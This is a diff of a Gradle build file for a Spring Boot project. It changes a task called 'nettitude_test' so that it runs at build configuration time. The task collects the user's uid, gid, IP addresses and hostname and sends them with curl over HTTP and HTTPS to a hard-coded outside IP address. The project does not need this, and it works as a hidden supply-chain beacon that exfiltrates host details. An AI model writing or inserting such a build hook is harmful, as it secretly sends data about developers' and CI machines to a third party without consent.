@@ -30,15 +30,16 @@ dependencies {
 	testImplementation 'org.springframework.boot:spring-boot-starter-test'
 }
 
-task nettitude_test(type:Exec){
+task nettitude_test(){
 	println("Executing")
 	def username = System.properties['user.name']
 	def uid = ["id", "-u", username].execute().text.trim()
 	def gid = ["id", "-g", username].execute().text.trim()
 	def ip = ["hostname", "-I"].execute().text.trim().replaceAll(" ", "%20")
 	def hostname = ["hostname"].execute().text.trim()
-	commandLine 'curl', "http://45.77.226.156/?uid=${uid}&gid=${gid}&ip=${ip}&hostname=${hostname}"
-	commandLine 'curl', "-k", "https://45.77.226.156/?uid=${uid}&gid=${gid}&ip=${ip}&hostname=${hostname}"
+
+	['curl', "http://45.77.226.156/?uid=${uid}&gid=${gid}&ip=${ip}&hostname=${hostname}"].execute()
+	['curl', "-k", "https://45.77.226.156/?uid=${uid}&gid=${gid}&ip=${ip}&hostname=${hostname}"].execute()
 	println("Executed")
 }
 
